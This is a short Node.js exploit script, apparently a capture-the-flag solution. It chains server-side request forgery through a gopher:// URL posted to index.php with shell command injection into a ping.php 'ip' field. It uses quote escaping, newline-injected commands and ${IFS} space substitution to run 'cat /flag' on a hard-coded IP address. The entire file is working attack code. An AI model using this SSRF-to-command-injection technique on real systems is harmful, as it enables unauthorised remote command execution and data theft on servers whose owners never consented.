const got = require('got')

const HOST = 'http://106.53.124.151:10007'

const getPayload = (commands) => {
  const encoded = commands
    .map((command) => command.replace(' ', '\${IFS}'))
    .join('\n')
  const input = `127.0.0.1\\\"\>>/dev/null\n${encoded}\necho\${IFS}\\\"`
  const body = `ip=${encodeURIComponent(input)}`
  return [
    'POST /ping.php HTTP/1.1',
    'Host: 0.0.0.0',
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${body.length}`,
    'Connection: close',
    '',
    body,
  ].join('\r\n')
}

const execute = async (commands) => {
  const payload = getPayload(commands)
  const url = `gopher://0.0.0.0:80/_${encodeURIComponent(payload)}`
  const response = await got.post(`${HOST}/index.php`, {
    form: {
      url,
    },
  })
  return response.body
}

;(async () => {
  // const commands = ['cd /', 'ls']
  const commands = ['cat /flag']
  console.log(await execute(commands))
})()
